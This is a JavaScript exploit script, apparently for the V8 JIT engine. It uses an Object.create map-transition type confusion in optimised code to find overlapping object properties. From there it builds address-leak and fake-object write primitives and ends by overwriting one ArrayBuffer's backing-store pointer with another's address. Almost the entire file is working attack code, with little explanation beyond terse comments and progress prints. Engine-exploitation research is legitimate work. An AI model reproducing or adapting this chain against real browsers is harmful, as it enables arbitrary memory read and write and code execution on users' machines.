let MAX_VALUES = 32
let p1, p2;

let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
    floatView[0] = this;
    return uint64View[0];
};

BigInt.prototype.toNumber = function toNumber() {
    uint64View[0] = this;
    return floatView[0];
};

function hex(value) {
  if (value === undefined) return "undefined"
  return "0x" + value.toString(16)
}

function makeObj() {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: 0x4040 + i
      });
  }
  return obj;
}

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 0; i < MAX_VALUES; i++) {
        pNames[i] = 'p' + i;
    }

    let pValues = []
    for (let i = 0; i < MAX_VALUES; i++) {
        pValues[i] = 0x4040 + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access Property inline of obj, forcing a CheckMap operation
      obj.inline;
      // Force a Map Transition via our side-effect
      this.Object.create(obj);
      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
    `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        // Create Object and pass it to Vuln function
        let res = vuln(makeObj());
        // Look for overlapping properties in results
        if (i === 9999) {
        	for (let j = 0; j < res.length; j++) {
        		valueToCompare = res[j] // res[j] from the DictionaryProperties
        		if ((pValues.includes(valueToCompare)) && (pNames[pValues.indexOf(valueToCompare)] !== "p"+j)) { // check if value is found in original pValues
        			index = pValues.indexOf(valueToCompare) // if it does get the index of the pValues to find the index of pNames (to know where in the DicionaryProperties can we control)
        			p1 = pNames[index]
        			p2 = "p"+j
              print("[-] Returning the first overlapping value found at " + p1 + " and " + p2 + ": " + hex(valueToCompare))
              return
        		}
        	} 
        }
    }
    throw "[!] Failed to find overlapping properties";
}

function testFoundOverlappingProperties(_p1, _p2) {
    // Create an array of all 32 property names such as p1..p32
    valueToTest = 0xbeef

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}
    }
    `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        eval(`
          let obj = makeObj();
          obj.${_p1} = ${valueToTest}
          let res = vuln(obj);
          if (i === 9999 && hex(res) !== "${hex(valueToTest)}") {
            throw "[!] Something fked up";
          }
        `)
    }
    print("[+] Control obtained!")
}

function makeSpecialObj_change_from_ints_to_objects() {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: { x: 0xdead }
      });
  }
  return obj;
}

function testFoundOverlappingProperties_change_from_ints_to_objects(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}.x
    }
    `)

    for (let i = 0; i < 10000; i++) {
        eval(`
          let obj = makeSpecialObj();
          obj.${_p2} = { x: 0xcafe }
          obj.${_p1} = { x: 0x5678 }
          let res = vuln(obj);
          if (i === 1) { print(hex(res)) } // should return 0xcafe
          if (i === 9999) { print(hex(res)) } // should return 0x5678
        `)
    }
}

function makeSpecialObj_must_be_done_this_way(must_pass_values_here) {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: must_pass_values_here[i]
      });
  }
  return obj;
}

function retrieveAddrOfFakeObjPrimative(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}.x
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Verify that objToLeak address is: 0x" + uint64View[0].toString(16));
        // %DebugPrint(objToLeak)
        break
      }
    }
}

function writeFakeObjPrimative(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      obj.${_p2}.x = 0x41414141
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    // pValues[parseInt(_p1_value)] = objToLeak // this is fine as well
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[7] Verify that we can write 0x41414141: " + hex(res))
        break
      }
    }
}

function retrieveAddrOfFakeObjPrimative_useArgument(_p1, _p2, _obj_to_make_rw_primative) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    pValues[parseInt(_p1_value)] = {cannotbex:_obj_to_make_rw_primative}
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Leaking arrayBuffer_2 address (w/o DebugPrint): 0x" + uint64View[0].toString(16));
        return uint64View[0];
      }
    }
}

function writeFakeObjPrimative_useArgument(_p1, _p2, _obj_to_make_rw_primative, _value_to_write) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      obj.${_p2}.x = ${_value_to_write}
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    // pValues[parseInt(_p1_value)] = objToLeak // this is fine as well
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print(`[7] Verify that we can write ${hex(_value_to_write)}: ${hex(res)}`)
        break
      }
    }
}

// if we use 2 properties here, then our fakeObj must also use 2 primatives
// _value_to_write is value we going to write to the _obj_to_make_rw_primative
function retrieveAddrOfFakeObjPrimative_useArgument_andUseTwoPropertiesObj(_p1, _p2, _obj_to_make_rw_primative) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x1
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x1:0,x2:0}
    }

    let x1_value = 1.1123
    let x2_value = 1.2123
    pValues[parseInt(_p1_value)] = {canbeanythingbutmustbesomething:_obj_to_make_rw_primative}
    pValues[parseInt(_p2_value)] = {x1:x1_value, x2:x2_value}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== x1_value) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Leaking arrayBuffer_2 address (w/o DebugPrint): 0x" + uint64View[0].toString(16));
        return uint64View[0]-1n; // work with bigint
        //return uint64View[0];
      }
    }
    throw "[!] fked up"
}

// instead of using { x: float }, we will use { val: float, x: float } to access backing store 
// _value_to_write is value we going to write to the _obj_to_make_rw_primative
function writeFakeObjPrimative_useArgument_andUseTwoPropertiesObj(_p1, _p2, _obj_to_make_rw_primative, _value_to_write) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x2;
      obj.${_p2}.x2 = ${_value_to_write}; // must be a number type
      return addressOfFakeObjToLeak // should match _value_to_write
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x1:0, x2:0}
    }

    let x1_value = 1.21212
    let x2_value = 1.11212
    pValues[parseInt(_p1_value)] = _obj_to_make_rw_primative // cannot wrap in object fml, this value is going to replace {fv:floatToBeCorruptedfv, sv:floatToBeCorruptedsv}
    pValues[parseInt(_p2_value)] = {x1:x1_value, x2:x2_value}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
    }
}

// each time you run the script, the overlap properties will change
// but within each run, the overlap properties will remain the same no matter the number of times your run the exploit function

print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties ${p1} and ${p2} overlap!`);
//findOverlappingProperties();
//print(`[+] Properties ${p1} and ${p2} overlap! (Must be the same as the previous run)`);
//testFoundOverlappingProperties(p1, p2);

let arrayBuffer_1 = new ArrayBuffer(1024);
let arrayBuffer_2 = new ArrayBuffer(1024);
//retrieveAddrOfFakeObjPrimative(p1, p2);
//writeFakeObjPrimative(p1, p2);
//address_of_array_buffer_2 = retrieveAddrOfFakeObjPrimative_useArgument(p1, p2, arrayBuffer_2);
//writeFakeObjPrimative_useArgument(p1, p2, arrayBuffer_1, address_of_array_buffer_2);
address_of_array_buffer_2 = retrieveAddrOfFakeObjPrimative_useArgument_andUseTwoPropertiesObj(p1, p2, arrayBuffer_2);
writeFakeObjPrimative_useArgument_andUseTwoPropertiesObj(p1, p2, arrayBuffer_1, address_of_array_buffer_2.toNumber());

let view1 = new BigUint64Array(arrayBuffer_1)
let originalArrBuf2BackingStore = view1[4]
print(`[+] ArrayBuffer_2 Backing Store: 0x${originalArrBuf2BackingStore.toString(16)}`);
print("[%] We have corrupted ArrayBuffer_1 object with ArrayBuffer_2 object")


